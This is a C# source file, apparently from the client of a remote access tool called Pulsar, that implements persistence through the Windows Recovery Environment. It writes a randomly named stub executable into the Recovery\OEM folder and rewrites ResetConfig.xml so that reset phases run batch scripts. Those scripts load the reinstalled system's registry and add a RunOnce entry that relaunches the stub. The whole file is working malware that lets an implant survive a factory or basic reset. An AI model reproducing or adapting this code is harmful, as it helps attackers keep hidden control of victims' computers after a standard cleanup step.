using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Xml.Linq;

namespace Pulsar.Client.Helper.WinRE
{
    public class WinREPersistence
    {
        private static readonly Random random = new Random();
        private static readonly string SystemDrive = Path.GetPathRoot(Environment.SystemDirectory);
        private static readonly string OEMPath = Path.Combine(SystemDrive, "Recovery", "OEM");
        private static readonly string OEMDataBackupPath = Path.Combine(OEMPath, "XRSBackupData");
        private static readonly string ResetConfigPath = Path.Combine(OEMPath, "ResetConfig.xml");

        private static string GenerateRandomString(int length)
        {
            return new string(Enumerable.Repeat("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", length).Select(s => s[random.Next(s.Length)]).ToArray());
        }

        public static bool CreateEnvironment()
        {
            if (!Directory.Exists(OEMPath))
            {
                try
                {
                    Directory.CreateDirectory(OEMPath);
                }
                catch (Exception ex)
                {
                    Debug.WriteLine(ex.Message);
                    return false;
                }
            }
            if (Directory.Exists(OEMDataBackupPath))
                return false;
            Directory.CreateDirectory(OEMDataBackupPath);
            return true;
        }

        public static void InstallFile(byte[] fileBytes, string extension)
        {
            if (CreateEnvironment())
                Debug.WriteLine("Created OEM Environment");
            else
                Debug.WriteLine("OEM Environment already exists, continuing installation");
            List<string> stringList = new List<string>();
            string path2 = GenerateRandomString(20) + extension;
            stringList.Add(path2);
            try
            {
                File.WriteAllBytes(Path.Combine(OEMPath, path2), fileBytes);
            }
            catch
            {
                Debug.WriteLine("Error writing stub file");
                return;
            }
            Debug.WriteLine("Successfully wrote stub file: " + path2);
            string payload = CreatePayload("cmd.exe /c start %TARGETOSDRIVE%\\Recovery\\OEM\\" + path2, false);
            string basicResetFileName = GenerateRandomString(20) + ".bat";
            string factoryResetFileName = GenerateRandomString(20) + ".bat";
            if (BackupCurrentConfig(basicResetFileName, factoryResetFileName, stringList.ToArray()))
                Debug.WriteLine("Successfully backed up current config");
            else
                Debug.WriteLine("Error backing up current config");
            CreateOrUpdateResetConfig(basicResetFileName, factoryResetFileName, payload);
            Debug.WriteLine("Successfully Installed!");
        }

        private static string CreatePayload(string command, bool UseEscaped = true)
        {
            string randomString = GenerateRandomString(20);
            string str = !UseEscaped ? command : command.Replace("%", "%%").Replace("^", "^^").Replace("&", "^&").Replace("|", "^|").Replace("<", "^<").Replace(">", "^>").Replace("\"", "\"\"");
            return "\r\n@echo off\r\nfor /F \"tokens=1,2,3 delims= \" %%A in ('reg query \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\RecoveryEnvironment\" /v TargetOS') DO SET TARGETOS=%%C\r\n\r\nfor /F \"tokens=1 delims=\\\" %%A in ('Echo %TARGETOS%') DO SET TARGETOSDRIVE=%%A\r\n\r\nreg load HKLM\\" + randomString + " %TARGETOSDRIVE%\\windows\\system32\\config\\SOFTWARE\r\n\r\nreg add HKLM\\" + randomString + "\\Microsoft\\Windows\\CurrentVersion\\RunOnce /v " + randomString + " /t REG_SZ /d \"" + str + "\"\r\n\r\nreg unload HKLM\\" + randomString + "\r\n";
        }

        private static bool BackupCurrentConfig(
          string basicResetFileName,
          string factoryResetFileName,
          string[] additionalDeletes = null)
        {
            List<string> contents = new List<string>()
            {
                basicResetFileName,
                factoryResetFileName
            };
            if (additionalDeletes != null)
                contents.AddRange(additionalDeletes);
            try
            {
                File.WriteAllLines(Path.Combine(OEMDataBackupPath, "DELETEME"), contents);
            }
            catch
            {
                return false;
            }
            if (File.Exists(ResetConfigPath))
            {
                try
                {
                    File.Copy(ResetConfigPath, Path.Combine(OEMDataBackupPath, "configBackup"), true);
                }
                catch
                {
                    return false;
                }
            }
            return true;
        }

        private static void CreateOrUpdateResetConfig(
          string basicResetFileName,
          string factoryResetFileName,
          string payload)
        {
            if (!File.Exists(ResetConfigPath))
                CreateNewResetConfig(basicResetFileName, factoryResetFileName, payload);
            else
                UpdateExistingResetConfig(basicResetFileName, factoryResetFileName, payload);
        }

        private static void CreateNewResetConfig(
          string basicResetFileName,
          string factoryResetFileName,
          string payload)
        {
            new XDocument(new XDeclaration("1.0", "utf-8", null), new object[1]
            {
                 new XElement((XName) "Reset", new object[2]
                {
                     CreateRunElement("BasicReset_AfterImageApply", basicResetFileName, 1),
                     CreateRunElement("FactoryReset_AfterImageApply", factoryResetFileName, 1)
                })
            }).Save(ResetConfigPath);
            SaveScriptFile(basicResetFileName, payload);
            SaveScriptFile(factoryResetFileName, payload);
        }

        private static void UpdateExistingResetConfig(
          string basicResetFileName,
          string factoryResetFileName,
          string payload)
        {
            XElement resetConfig = XElement.Load(ResetConfigPath);
            XElement[] array = resetConfig.Elements((XName)"Run").Where(e => (string)e.Attribute((XName)"Phase") == "FactoryReset_AfterImageApply" || (string)e.Attribute((XName)"Phase") == "BasicReset_AfterImageApply").ToArray();
            int duration = array.Max(e => (int)e.Element((XName)"Duration"));
            string additionalCommand1 = UpdatePhase(array, "BasicReset_AfterImageApply", basicResetFileName);
            string additionalCommand2 = UpdatePhase(array, "FactoryReset_AfterImageApply", factoryResetFileName);
            if (additionalCommand1 == null)
                AddNewPhase(resetConfig, "BasicReset_AfterImageApply", basicResetFileName, duration);
            if (additionalCommand2 == null)
                AddNewPhase(resetConfig, "FactoryReset_AfterImageApply", factoryResetFileName, duration);
            SaveScriptFile(basicResetFileName, payload, additionalCommand1);
            SaveScriptFile(factoryResetFileName, payload, additionalCommand2);
            resetConfig.Save(ResetConfigPath);
        }

        private static XElement CreateRunElement(string phase, string path, int duration)
        {
            return new XElement((XName)"Run", new object[3]
            {
                new XAttribute((XName) "Phase",  phase),
                new XElement((XName) "Path",  path),
                new XElement((XName) "Duration",  duration)
            });
        }

        private static string UpdatePhase(XElement[] phases, string phaseName, string fileName)
        {
            XElement xelement = phases.FirstOrDefault(p => (string)p.Attribute((XName)"Phase") == phaseName);
            if (xelement == null)
                return null;
            string str1 = "%TARGETOSDRIVE%\\Recovery\\OEM\\" + (string)xelement.Element((XName)"Path");
            string str2 = (string)xelement.Element((XName)"Param") ?? string.Empty;
            xelement.Element((XName)"Param")?.Remove();
            xelement.Element((XName)"Path").Value = fileName;
            return "\"" + str1 + "\" " + str2;
        }

        private static void AddNewPhase(
          XElement resetConfig,
          string phaseName,
          string fileName,
          int duration)
        {
            XElement runElement = CreateRunElement(phaseName, fileName, duration);
            resetConfig.Add(runElement);
        }

        private static void SaveScriptFile(string fileName, string payload, string additionalCommand = null)
        {
            string contents = payload;
            if (!string.IsNullOrEmpty(additionalCommand))
                contents += additionalCommand;
            try
            {
                File.WriteAllText(Path.Combine(OEMPath, fileName), contents);
                Debug.WriteLine("Wrote Stuff");
            }
            catch
            {
                Debug.WriteLine("Error writing: " + fileName);
            }
        }

        public static void Uninstall()
        {
            if (!Directory.Exists(OEMDataBackupPath))
            {
                Debug.WriteLine("Not Installed");
                return;
            } 
            
            Debug.WriteLine("Uninstalling Reset Persistence");
            _Uninstall();
            Debug.WriteLine("Uninstalled Reset Persistence");
        }

        private static void _Uninstall()
        {
            try
            {
                Directory.Delete(OEMPath, true);
            }
            catch (Exception ex)
            {
                Debug.WriteLine("Error restoring config file: " + ex.Message);
            }
        }
    }
}